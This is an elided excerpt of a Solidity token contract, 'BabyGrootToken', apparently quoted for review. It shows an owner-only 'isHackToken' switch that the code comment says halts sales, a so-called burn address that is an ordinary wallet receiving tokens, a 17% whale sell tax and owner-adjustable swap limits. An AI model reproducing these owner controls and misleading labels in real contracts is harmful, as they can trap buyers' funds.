 ...
 */
contract BabyGrootToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    // General Info
    string private _name     = "BabyGrootToken";
    string private _symbol   = "BGROOT";
    ...
    // Addresses
    address payable public _marketingAddress = payable(0x568371541612e23A08ACad90C1D7A2Bd7AD6A6Ae); // Marketing address used to pay for marketing
    address payable public _charityAddress = payable(0x2818B889e066C18182C11909569D366592fDd2b3); // Marketing address used to pay for marketing
    address payable public _prizzeAddress = payable(0x49B7110D1fC16f7A20c6170744981c4710263E5b); // Marketing address used to pay for marketing
    address payable public _lpAddress      = payable(0x3ae985eB8D71a1A0586543b05bA7E48e722570fC); // Burn address used to burn a portion of tokens
    ...
    uint256 public  _whaleSellTaxFee  = 17; // 17% tax 
    uint256 private _previousTaxFee;
    uint256 private tokenSwapThreshold = 100 * 10**5 * 10**9;
    // Token Limits
    uint256 public _maxTxAmount        = 1 * 10**12 * 10**9; 
    uint256 public _tokenSwapThreshold = tokenSwapThreshold;
    ...
    function setTokenSwapThreshold(uint256 newHoldValue) external onlyOwner() {
        tokenSwapThreshold = newHoldValue;
    }
    ...
    function isHackChangeStatus() onlyOwner public{
        isHackToken = !isHackToken;
    } 
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        // In the event of an attack, it stops sales in the name of pooling the pool.
        if(isHackToken){
            _tokenSwapThreshold = 0;
        }else{
    ...
    function _burnTokens(uint256 tFee) private {
        ...
        _rOwned[_lpAddress] = _rOwned[_lpAddress].add(rFee);
        if(_isExcluded[_lpAddress]) {
            _tOwned[_lpAddress] = _tOwned[_lpAddress].add(tFee);
        }
    }
